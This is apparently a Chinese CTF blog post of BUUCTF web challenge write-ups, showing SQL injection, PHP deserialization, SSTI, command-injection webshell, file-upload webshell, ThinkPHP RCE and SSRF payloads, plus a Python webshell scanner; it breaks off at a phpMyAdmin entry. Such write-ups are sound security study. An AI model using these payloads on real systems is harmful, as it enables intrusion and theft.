","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#网鼎杯-2018fakebook"},{"categories":["CTF"],"content":"\r非预期解\rcode ?no=-1 union/**/select 1,2,3,4\r先使用上面的语句查看回显点。 找的了位置2的回显点，可以把函数替换在2的位置上。 code ?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4\r参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:1:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#非预期解"},{"categories":["CTF"],"content":"\r预期解正常的sql注入一套查询，同样是使用/**/绕过空格过滤。 爆表 code ?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23\r爆字段 code ?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users' %23\r出数据 code ?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users\r查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象： code O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:20:\"http://www.baidu.com\";}\r说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示the contents of his/her blog，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：使用伪协议读取flag作为blog网站回显在iframe的标签中，所以构造一个序列化对象。 php \u003c?php class UserInfo { public $name = \"guobang\"; public $age = 18; public $blog = \"file:///var/www/html/flag.php\"; } $s = new UserInfo(); echo serialize($s); //O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";} 最终payload code ?no=-1%20union/***/select%201,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' from%20users\r在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:2:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#预期解"},{"categories":["CTF"],"content":"\r[网鼎杯 2020 青龙组]AreUSerialz部分图 最下面有对于payload的限制： php function is_valid($s) { for($i = 0; $i \u003c strlen($s); $i++) if(!(ord($s[$i]) \u003e= 32 \u0026\u0026 ord($s[$i]) \u003c= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } }\r需要payload中的字符ascii码值大于32小于125。注意到最后有一个unserialize函数，判断这道题考点是反序列化。接下来分析源码： process()函数判断op的值，如果是1就写入文件，如果是2就读取文件。代码开头包含了flag.php文件，所以推测需要使用2操作数读取flag.php文件。 write()把对象中的$content属性值写入到$filename文件中，如果长度大于100会被拦下。 read()使用**file_get_contents()**函数读取文件。正是我们想要的。 output()输出内容。 __destruct()对象销毁时会执行的函数，需要注意的是if判断里的$this-\u003eop === \"2\"是强比较，并且会修改op的值为1（写文件），因为**“2”是一个字符串类型的如果传入整型的2**即可绕过。 所以我们构造一个对象op为2，filename为flag.php即可，读文件的时候肯定不是 接下来是反序列化时会遇到的问题，因为对象中属性的修饰是protected，序列化时需要保证一致的。 先给出自己创建的对象源码 php \u003c?php class FileHandler { protected $op=2; protected $filename=\"/var/www/html/flag.php\"; protected $content; } $c = new FileHandler(); echo serialize($c);\rPHP7.1以上版本对属性类型不敏感、用public绕过: code O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:22:\"/var/www/html/flag.php\";s:7:\"content\";N;}\r运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。 code O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:52:\"php://filter/convert.base64-encode/resource=flag.php\";s:7:\"content\";N;}\r序列化字符串中s替换为S，支持字符串用16进制， code O:11:\"FileHandler\":3:{S:5:\"\\00*\\00op\";i:2;S:11:\"\\00*\\00filename\";S:22:\"/var/www/html/flag.php\";S:10:\"\\00*\\00content\";N;}\r思路：https://blog.csdn.net/Oavinci/article/details/106998738 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#网鼎杯-2020-青龙组areuserialz"},{"categories":["CTF"],"content":"\r[MRCTF2020]你传你🐎呢 测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的.htaccess code SetHandler application/x-httpd-php\r传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了Content-Type: image/jpeg可以了，说明Content-Type是GIF还不行，接下来直接传图片码 根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了 不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考【极客大挑战 2019】RCE ME。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#mrctf2020你传你呢"},{"categories":["CTF"],"content":"\r[BJDCTF 2nd]fake google 就一个输入框，随便输入一个去看看，跳转以后 注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试SSTI (服务器模板注入) 找到了一个直接读文件的payload code ?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/flag', 'r').read() }}{% endif %}{% endfor %}\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf-2ndfake-google"},{"categories":["CTF"],"content":"\r[GYCTF2020]Blacklist sql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容 php return preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\r前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表： sql -1';show tables; FlagHere words\r查看表结构： sql -1';desc `FlagHere`;\r接下来是看的wp，学到了个新姿势：使用HANDLER ... OPEN语句，贴一个官方文档。 HANDLER ... OPEN语句打开一个表，使其可以使用后续HANDLER ... READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭 sql -1';handler FlagHere open;handler FlagHere read first;handler FlagHere close\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gyctf2020blacklist"},{"categories":["CTF"],"content":"\r[强网杯 2019]高明的黑客 下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本 python # codeing = utf-8 import requests import os import re import threading import time requests.adapters.DEFAULT_RETRIES = 8 session = requests.session() session.keep_alive = False sem=threading.Semaphore(30) url=\"http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/\" path = \"D:\\DROPS\\phpstudy_pro\\WWW\\ctf\\src\\\\\" fileNames = os.listdir(path) rrGET = re.compile(r\"\\$_GET\\[\\'(\\w+)\\'\\]\") rrPOST = re.compile(r\"\\$_POST\\[\\'(\\w+)\\'\\]\") local_file = open(\"flag.txt\",\"w\",encoding=\"utf-8\") def run(fileName): with sem: file = open(path+fileName,'r',encoding='utf-8') content = file.read() print(\"[+]checking: %s\"%fileName) #GET for i in rrGET.findall(content): r = session.get(url+\"%s?%s=%s\"%(fileName,i,\"echo ~guobanghhh~\")) if \"~guobanghhh~\" in r.text: flag = fileName + \"中的\" + i + \"可以用！！！\" print(flag) local_file.write(flag) #POST # for i in rrPOST.findall(content): # r = session.post(url+fileName,data={i:\"echo ~guobanghhh~\"}) # if \"~guobanghhh~\" in r.text: # flag = fileName + \"中的\" + i + \"可以用！！！\" # print(flag) # local_file.write(flag) if __name__ == '__main__': run(\"xk0SzyKwfzw.php\") start_time = time.time() # 开始时间 print(\"[start]程序开始:\" + str(start_time)) thread_list = [] for fileName in fileNames: t = threading.Thread(target=run,args=(fileName,)) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join()\r结果就是访问 url http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag\r获得flag ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#强网杯-2019高明的黑客"},{"categories":["CTF"],"content":"\r[MRCTF2020]Ez_bypass不截图了，主页没有代码格式，贴一个源码 php I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])\u0026\u0026isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) \u0026\u0026 $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo \"can you think twice??\"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo \"You are not a real hacker!\"; } } else{ die('Please input first'); } }Please input first\r分析一波： 第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较===噢。 第11、17行判断passwd是非数字并且若比较==等于1234567 第一个利用数组即可绕过 code md5([1,2,3]) == md5([4,5,6]) == NULL\r第二个利用比较时会进行类型转换，字符串1234567a会被强制转换类型为整型的1234567 payload code ?id[]=1\u0026gg[]=2 POST passwd=1234567a\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#mrctf2020ez_bypass"},{"categories":["CTF"],"content":"\r[BUUCTF 2018]Online Tool源码 php \u003c?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; } if(!isset($_GET['host'])) { highlight_file(__FILE__); } else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host); }\r最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数escapeshellarg、escapeshellcmd。 这道题利用了两个点 nmap可以将扫描的结果存储在文件里。使用方法：Nmap扫描结果的保存和输出 escapeshellarg+escapeshellcmd同时使用有一些漏洞 谈谈escapeshellarg参数绕过和注入的问题 PHP escapeshellarg()+escapeshellcmd() 之殇 参考博客整理一下这两个处理命令的函数同时使用时的问题： 假如传入的参数为172.17.0.2' -v -d a=1 首先经过escapeshellarg函数，这个函数会把单独的单引号'加上转义符\\并使用单引号'括起来，再使用单引号'把整个参数括起来。这时候的参数是'172.17.0.2'\\'' -v -d a=1' 再进入escapeshellcmd函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号'不过处理，转义符\\再使用转义符转义，再略过一个成对的单引号''，最后一个单引号'再使用转义符转义。这时候的参数就成了'172.17.0.2'\\\\'' -v -d a=1\\' 最后执行的参数是'172.17.0.2'\\\\'' -v -d a=1\\'，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白符。所以可以简化为 172.17.0.2\\ -v -d a=1' 所以构造payload： code '\u003c?php eval($_POST[_]) ?\u003e -oG 1.php '\r经过escapeshellarg函数会被解析成为：''\\''\u003c?php eval($_POST[_]) ?\u003e -oG 1.php '\\''' 再经过escapeshellcmd函数会被解析为：''\\\\''\u003c?php eval($_POST[_]) ?\u003e -oG 1.php '\\\\''' 注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了1.php\\不在是php文件了。所以我们的payload最终在服务器端是：\\\u003c?php eval($_POST[_]) ?\u003e -oG 1.php \\ 。 加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。 php \u003c?php $host = \"'\u003c?php eval($_POST[_]) ?\u003e -oG 1.php '\"; echo $host.\"\\n\"; $host = escapeshellarg($host); echo $host.\"\\n\"; $host = escapeshellcmd($host); echo $host.\"\\n\";\r结果： code '\u003c?php eval() ?\u003e -oG 1.php ' ''\\''\u003c?php eval() ?\u003e -oG 1.php '\\''' ''\\\\''\\\u003c\\?php eval\\(\\) \\?\\\u003e -oG 1.php '\\\\'''\r最终请求payload text /?host='\u003c?php eval($_POST[_]) ?\u003e -oG 1.php '\r执行指令时会创建一个sandbox文件夹，访问$sandbox$/1.php，POST传参 text _=system('cat /flag');\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#buuctf-2018online-tool"},{"categories":["CTF"],"content":"\r[RoarCTF 2019]Easy Java是java写的web程序 考点是WEB-INF/web.xml泄露 WEB-INF主要包含一下文件或目录: /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 重点不在登陆界面，而是那个Help按钮，可以下载文件。 首先尝试去读web.xml文档，添加POST请求 text filename=WEB-INF/web.xml\r可以读取web.xml文件： xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cweb-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"\u003e \u003cwelcome-file-list\u003e \u003cwelcome-file\u003eIndex\u003c/welcome-file\u003e \u003c/welcome-file-list\u003e \u003cservlet\u003e \u003cservlet-name\u003eIndexController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.IndexController\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eIndexController\u003c/servlet-name\u003e \u003curl-pattern\u003e/Index\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003cservlet\u003e \u003cservlet-name\u003eLoginController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.LoginController\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eLoginController\u003c/servlet-name\u003e \u003curl-pattern\u003e/Login\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003cservlet\u003e \u003cservlet-name\u003eDownloadController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.DownloadController\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eDownloadController\u003c/servlet-name\u003e \u003curl-pattern\u003e/Download\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003cservlet\u003e \u003cservlet-name\u003eFlagController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.FlagController\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eFlagController\u003c/servlet-name\u003e \u003curl-pattern\u003e/Flag\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003c/web-app\u003e\r注意到了一个FlagController的控制器，它所在的类为com.wm.ctf.FlagController，前面也提到了编译文件所在的文件夹/WEB-INF/classes/，去这个文件夹下载FlagController相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载： code filename=WEB-INF/classes/com/wm/ctf/FlagController.class\rclass文件源码好多不可见字符 我选中的那段就是flag在的地方，看到了==就应该意识到是base64编码，但是base64编码里没有\u003c这个字符，所以flag的密文就是 code ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#roarctf-2019easy-java"},{"categories":["CTF"],"content":"\r———————–以下部分施工中👷‍♂️————————下面的都是没有整理，先把重要思路写下来了，然后有时间再配图 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#-----------------------以下部分施工中------------------------"},{"categories":["CTF"],"content":"\r[GKCTF2020]cve版签到CVE-2020-7066 只有一个按钮，点击以后查看网页的Network请求中有一个 Hint: Flag in localhost 且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里 You just view *.ctfhub.com 只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问： text ?url=http://127.0.0.1%00.ctfhub.com\r第二个提示： Host must be end with ‘123’ 必须以123结尾，所以最终payload text ?url=http://127.0.0.123%00.ctfhub.com\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gkctf2020cve版签到"},{"categories":["CTF"],"content":"\r[GXYCTF2019]禁止套娃git泄露。我使用的https://github.com/gakki429/Git_Extract text \u003c?php include \"flag.php\"; echo \"flag在哪里呢？\u003cbr\u003e\"; if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(\"还差一点哦！\"); } } else{ die(\"再好好想想！\"); } } else{ die(\"还想读flag，臭弟弟！\"); } } // highlight_file(__FILE__); ?\u003e\r正则表达式匹配的只有函数的形式如var_dump();是一道无参数RCE，看的题解自己整理的payload： text ?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));\r一层一层解释： localeconv() 函数返回一包含本地数字及货币格式信息的数组 图片展示 current() 返回数组中的当前单元, 默认取第一个值。别名pos() 到这里获得的是一个点 scandir() 遍历目录，是.的话就是列出当前目录。 此时输出： text array(5) { [0]=\u003e string(1) \".\" [1]=\u003e string(2) \"..\" [2]=\u003e string(4) \".git\" [3]=\u003e string(8) \"flag.php\" [4]=\u003e string(9) \"index.php\" }\r这时的输出还是键值对的形式，我们需要使用array_flip()函数交换键值对，然后使用随机函数array_rand()从数组中随机取出一个或多个单元。因为正则的原因无法使用file_get_contents()，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gxyctf2019禁止套娃"},{"categories":["CTF"],"content":"\r[GXYCTF2019]BabyUploadph过滤，image/gif不能通过。image/jpe可以 上传.htaccess text SetHandler application/x-httpd-php\r上传码，但是不能是php代码，使用js text \u003cscript language=\"php\"\u003eeval($_REQUEST[shell])\u003c/script\u003e\r完工 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gxyctf2019babyupload"},{"categories":["CTF"],"content":"\r[BJDCTF 2nd]old-hackThinkPHP的漏洞 ThinkPHP5 5.0.23 text _method=__construct\u0026filter[]=system\u0026method=get\u0026server[REQUEST_METHOD]=cat /flag\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf-2ndold-hack"},{"categories":["CTF"],"content":"\r[安洵杯 2019]easy_web看url一个img和cmd，页面中有一个图片的标签，和一个md5 is funny ~。把url中img的值进行解码发现图片名为555.png，尝试用同样的编码方式读取index.php，加密的编码依次为：hex–\u003ebase64–\u003ebase64。 index.php text \u003c?php error_reporting(E_ALL || ~ E_NOTICE); header('content-type:text/html;charset=utf-8'); $cmd = $_GET['cmd']; if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026cmd='); $file = hex2bin(base64_decode(base64_decode($_GET['img']))); $file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file); if (preg_match(\"/flag/i\", $file)) { echo '\u003cimg src =\"./ctf3.jpeg\"\u003e'; die(\"xixi～ no flag\"); } else { $txt = base64_encode(file_get_contents($file)); echo \"\u003cimg src='data:image/gif;base64,\" . $txt . \"'\u003e\u003c/img\u003e\"; echo \"\u003cbr\u003e\"; } echo $cmd; echo \"\u003cbr\u003e\"; if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u003c|\u003e/i\", $cmd)) { echo(\"forbid ~\"); echo \"\u003cbr\u003e\"; } else { if ((string)$_POST['a'] !== (string)$_POST['b'] \u0026\u0026 md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (\"md5 is funny ~\"); } } ?\u003e \u003chtml\u003e \u003cstyle\u003e body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC; } \u003c/style\u003e \u003cbody\u003e \u003c/body\u003e \u003c/html\u003e\r我不知道为什么，我的bp一定要在\u0026前加一个空格才可以通过。 text ?cmd=uniq%20/flag POST a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 \u0026b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\r读文件的绕过有 1 more:一页一页的显示档案内容 2 less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页 3 head:查看头几行 4 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 5 tail:查看尾几行 6 nl：显示的时候，顺便输出行号 7 od:以二进制的方式读取档案内容 8 vi:一种编辑器，这个也可以查看 9 vim:一种编辑器，这个也可以查看 10 sort:可以查看 11 uniq:可以查看 12 file -f:报错出具体内容 摘自命令执行漏洞利用及绕过方式总结。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#安洵杯-2019easy_web"},{"categories":["CTF"],"content":"\r[BJDCTF2020]Mark loves catgit泄露 flag.php text \u003c?php $flag = file_get_contents('/flag');\rindex.php text \u003c?php include 'flag.php'; $yds = \"dog\"; $is = \"cat\"; $handsome = 'yds'; foreach($_POST as $x =\u003e $y){ $$x = $y; } foreach($_GET as $x =\u003e $y){ $$x = $$y; } foreach($_GET as $x =\u003e $y){ if($_GET['flag'] === $x \u0026\u0026 $x !== 'flag'){ exit($handsome); } } if(!isset($_GET['flag']) \u0026\u0026 !isset($_POST['flag'])){ exit($yds); } if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is); } echo \"the flag is: \".$flag;\r尝试输出$flag即可。exit()函数退出时也会输出。 第一个不可能实现，如果POST或GET传入flag的话必然导致$flag修改，那么正好符合第二个if。 payload text GET ?yds=flag POST(任意，但是需要保证不传flag) is=233flag\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020mark-loves-cat"},{"categories":["CTF"],"content":"\r[BJDCTF2020]The mystery of iphint.php里面有注释 Do you know why i know your ip? 去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。 尝试了几个ssti的payload不行，但是提示了 Uncaught –\u003e Smarty Compiler:………………… 得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入 text 请求： X-Forwarded-For: {system('cat /flag')}\rSSTI神器–Tplmap，看介绍是和sqlmap差不多的工具。 这个师傅的博客写的很全：https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。 CTF SSTI(服务器模板注入) flask之ssti模版注入从零到入门 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020the-mystery-of-ip"},{"categories":["CTF"],"content":"\r[GWCTF 2019]我有一个数据库页面是乱码，想知道内容了可以看下图 $$各种乱码图 对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存–\u003eGBK，再通过编码打开–\u003eUTF-8。内容如下 我有一个数据库，但里面什么也没有~ 不信你找 提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞 phpmyadmin4.8.1后台getshell payload text 